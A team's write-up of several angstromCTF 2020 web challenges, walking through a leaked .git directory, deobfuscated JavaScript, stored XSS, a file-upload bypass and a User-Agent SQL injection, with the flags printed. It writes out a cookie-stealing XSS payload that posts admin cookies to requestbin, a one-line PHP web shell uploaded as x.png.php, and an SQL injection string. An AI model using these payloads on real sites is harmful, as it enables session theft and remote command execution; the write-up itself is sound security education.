# angstromCTF 2020
### This is our writeups for ångstromCTF 2020.
![angstrom-3e0d6c871da7786e59fcc988735f4f5ded75aab5fac89f538291b3ef033801eb](https://user-images.githubusercontent.com/36403473/77215806-d4b45380-6b1e-11ea-8853-b9539e6bc4d0.png)

i participated in ångstromCTF 2020 with my awesome team P1rates as python_4004 & my dude mokey  . This is our writeups about some challenges we solved during the competition.

# Web challenges 
## Git Good
 Noting the name of the challenge, I think the system is based on git management system 
 But I have to make sure first , so i will use dirb tool
![dirb](https://user-images.githubusercontent.com/36403473/77215204-85205880-6b1b-11ea-9ca2-a46a3b8c8347.png)

now lets try to download git files 
to do that open your terminal and write 
git clone +the link of the challenge 
##### <code> <b> git clone https://gitgood.2020.chall.actf.co/.git </b> </code> 
![Screenshot from 2020-03-21 02-37-29](https://user-images.githubusercontent.com/36403473/77215565-5f944e80-6b1d-11ea-9f41-b7f8d0feba48.png)
The first thing I thought about was looking at the log file
##### <code> <b>git log -p</b> </code>
![Screenshot from 2020-03-21 02-41-08](https://user-images.githubusercontent.com/36403473/77215657-037dfa00-6b1e-11ea-8edf-e4d6b2588f11.png)
the flag is :
#### actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}
## Consolation

by clicking on <b> pay my some money </b> it call <b> nofret() </b> function so let's see  source code  
![Screenshot from 2020-03-21 03-36-56](https://user-images.githubusercontent.com/36403473/77216945-2f51ad80-6b27-11ea-8634-b35ee7b33fe3.png)

okey i found that javascript is obfuscated.
so we need to revesre this code ,i use this online platform to decode our obfuscated js file <b> http://www.jsnice.org/ </b>

![Screenshot from 2020-03-21 03-46-10](https://user-images.githubusercontent.com/36403473/77216996-86578280-6b27-11ea-808b-fe5a8a3fb972.png)

looking very well i found ohh lets delete this line and put thit function on console <b>console ["clear"] ();</b>

![Screenshot from 2020-03-21 04-02-07](https://user-images.githubusercontent.com/36403473/77217187-2feb4380-6b29-11ea-9442-0a00b9398630.png)

the flag is : 
#### <b> actf{you_would_n0t_beli3ve_your_eyes} </b>

## The Magic Word

it was very easy challenge what you should do only open <b>inspect</b>  and Change <b> "give flag" </b> to <b> "please give flag" </b>
![Screenshot from 2020-03-21 04-07-53](https://user-images.githubusercontent.com/36403473/77217291-fff07000-6b29-11ea-8a41-ac63fdd4ef62.png)
the flag is : 
#### <b> actf{1nsp3c7_3l3m3nt_is_y0ur_b3st_fri3nd} </b>

## Xmas Still Stands

This was an easy <b> xss stored </b>  challenge given the following:
 
first i post this post <img src=x onerror='requestbin?cookie='+document.cookie>
i use requestbin to get admin cookies 
![Screenshot from 2020-03-21 04-26-16](https://user-images.githubusercontent.com/36403473/77217832-1e586a80-6b2e-11ea-9c2c-020f7d1e9376.png)

i reported my post to admin , checking my requestbin i found the flag 

![9d2b4cb0-d98d-4053-a165-341fc82d376d](https://user-images.githubusercontent.com/36403473/77217880-9faffd00-6b2e-11ea-8e50-b45a691fbb00.jpeg)

the flag is :  
#### <b>actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds} </b>

## Defund's Crypt
![Screenshot from 2020-03-21 04-57-04](https://user-images.githubusercontent.com/36403473/77218213-a12ef480-6b31-11ea-86c7-09e8394d72f5.png)
 It’s file upload injection so lets try to upload shell In the form of a picture format
i  googled and find this good  <a href="https://www.slideshare.net/HackIT-ukraine/15-technique-to-exploit-file-upload-pages-ebrahim-hegazy"> article </a> 
our extention will be x.png.php
this is our shell script <b> <?php system($_GET['cmd']);?> </b>
using <b> `burpsuit` </b> :

![89855682_714296872437271_6861930706059132928_n](https://user-images.githubusercontent.com/36403473/77218435-f966f600-6b33-11ea-9f09-65610aec3372.png)

#### response 
![89873018_212735623171923_7771926506762141696_n](https://user-images.githubusercontent.com/36403473/77218455-24e9e080-6b34-11ea-9e43-9ad8026e5ebd.png)

the flag is:
#### <b> actf{th3_ch4ll3ng3_h4s_f4ll3n_but_th3_crypt_rem4ins} </b>

## Secret Agents
from <b> `burpsuit` </b> i check user-agent header and try to inject it manually
After many attempts, I finally  i reach  to the flag 
using this query  `a' or 1 limit 1 offset 2 -- -`

![89852223_205522447361583_8420305932386304000_n](https://user-images.githubusercontent.com/36403473/77218690-b1959e00-6b36-11ea-9741-89c911e231ef.png)

the flag is :
#### <b> actf{nyoom_1_4m_sp33d} </b>
